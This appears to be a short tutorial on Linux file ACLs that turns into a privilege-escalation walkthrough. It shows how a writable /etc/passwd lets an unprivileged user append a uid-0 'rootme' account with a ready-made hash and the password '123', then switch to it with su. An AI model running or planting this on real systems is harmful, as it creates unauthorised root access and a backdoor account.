## Access Control List (ACL) in Linux
ACL allow us to appy a mpre specific set of permissions to a file or directory without chaning the base ownership and permissions. In this we can assain a particular user a specfic permission and give two or more group permission.

## The primary tools for managing ACLs are:
- **getfacle**: – View ACL permissions
- **setfacl**:setfacl – Modify ACL permissions

## Checking ACL permissions
Use the getfacl command to check if a file or directory has ACLs set:
```bash
getfacl /file-path
```

Example output:
```bash
# file: file-name
# owner: root
# group: root
user::rw-
user:user1:rwx
group::r--
mask::rwx
other::---
```
Here, the user user1 has rwx permissions on the file, even though he is not the owner.


## Exploiting Misconfigured ACLs
If a user has excessive permissions on sensitive files or executables, privilege escalation may be possible.

### **Write Permissions on /etc/passwd**
If an unprivileged user has write access to /etc/passwd, they can modify it to create a new user with root privileges.

Check ACLs on /etc/passwd
```bash
getfacl /etc/passwd
```
output:
```bash
# file: etc/passwd
# owner: root
# group: root
user::rw-
user:user1:rwx
group::r--
mask::rwx
other::---
```
user1 has write access, they can add a new root user manually:
```bash
echo 'rootme:$1$gi/ZEUV2$uaJQ9FUakihoLNuErGCkw0:0:0:root:/root:/bin/bash' >> /etc/passwd
```
Then, switch to the new root user:
```bash
su rootme
```
Password is 123
